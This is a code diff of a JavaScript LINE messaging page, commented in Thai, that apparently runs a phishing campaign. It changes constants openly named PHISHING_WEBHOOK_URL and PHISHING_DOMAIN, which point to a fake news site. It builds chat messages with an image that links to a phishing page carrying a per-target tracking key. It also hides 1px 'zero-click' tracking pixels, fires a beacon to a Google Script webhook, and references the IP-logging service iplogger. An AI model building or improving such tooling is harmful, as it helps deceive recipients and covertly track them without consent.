@@ -407,7 +407,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzycp3IU-zw6Iuw9et3bCVVYLvOrQSvwIDz-FVXraYI5we6-xO3UC9HEGXiKwtvJo9IyQ/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx_iz_GUtDWWX_6Ml_Oq-vLPEx5w7WheY72eZHuG_EMuBPVsna6dLP5W67e3759G7Li/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -828,18 +828,30 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับการติดตาม Zero Click (รูปภาพขนาด 1x1 pixel ที่จะเรียกเมื่อเป้าหมายเปิดดูข้อความ)
+                // สร้าง URL สำหรับการติดตาม Zero Click
+                // ใช้ URL ที่มีจุดหมายเป็นรูปภาพโปร่งใสโดยตรง แทนการใช้ Google Script endpoint
+                // โดยเพิ่ม query parameters สำหรับ tracking
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                
+                // ใช้ URL ของรูปภาพโปร่งใสจาก imgbb หรือ CDN อื่นๆ ที่เร็วกว่า
+                // และเพิ่ม query parameters สำหรับ tracking โดยใช้ redirector service
+                const trackRedirectUrl = `https://iplogger.org/invisible/`;
                 const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&r=${randomSuffix}`;
+                
+                // เลือกใช้รูปภาพโปร่งใสจาก CDNs ที่เชื่อถือได้และโหลดเร็ว
+                const transparentPixelUrl = 'https://upload.wikimedia.org/wikipedia/commons/c/ca/1x1.png'; 
+                // หรือใช้ data URI แทน URL เพื่อป้องกันปัญหาการโหลดจากภายนอก
+                const dataURITransparentPixel = 'data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
                 
                 console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ และรูปภาพ tracking pixel ที่ซ่อนอยู่
+                // สร้าง Flex Message โดยใช้โครงสร้างที่เหมาะสมกับ LINE
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
                     contents: {
                         type: 'bubble',
+                        size: 'mega',
                         hero: { // รูปภาพหลักที่คลิกได้
                             type: 'image',
                             url: imageUrl,
@@ -851,32 +863,34 @@
                                 uri: clickTrackUrl
                             }
                         },
-                        body: {
+                        footer: {
                             type: 'box',
                             layout: 'vertical',
                             contents: [
                                 {
-                                    // รูปภาพขนาดเล็กมากที่มองไม่เห็นเพื่อทำ Zero-Click tracking
                                     type: 'image',
-                                    url: zeroClickTrackUrl,
-                                    size: 'xxs',
+                                    url: dataURITransparentPixel,
+                                    size: '1px',
                                     aspectRatio: '1:1',
-                                    aspectMode: 'cover',
-                                    position: 'absolute',
-                                    offsetStart: '0px',
-                                    offsetTop: '0px',
-                                    width: '1px',
-                                    height: '1px'
+                                    aspectMode: 'fit'
                                 },
                                 {
-                                    type: 'text',
-                                    text: ' ', // ช่องว่างที่มองไม่เห็น
-                                    color: '#ffffff',
-                                    size: '1px'
+                                    type: 'box',
+                                    layout: 'vertical',
+                                    contents: [
+                                        {
+                                            type: 'image',
+                                            url: `${transparentPixelUrl}?key=${trackingKey}&r=${randomSuffix}`,
+                                            size: '1px',
+                                            aspectRatio: '1:1',
+                                            aspectMode: 'fit'
+                                        }
+                                    ],
+                                    height: '1px'
                                 }
                             ],
-                            height: '1px',
-                            paddingAll: '0px'
+                            spacing: 'none',
+                            height: '1px'
                         }
                     }
                 };
@@ -899,6 +913,16 @@
                             } else {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
                             }
+                            
+                            // ทำการร้องขอ Zero Click tracking ไปยัง Google Script Web App
+                            // ด้วยการยิง request ตรงออกไปจาก client โดยตรง
+                            fetch(zeroClickTrackUrl, {
+                                method: 'GET',
+                                mode: 'no-cors'  // ป้องกันปัญหา CORS
+                            })
+                            .then(() => console.log("Zero Click tracking request sent from client"))
+                            .catch(err => console.error("Zero Click request error:", err));
+                            
                         } catch (saveError) {
                             console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
                             showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
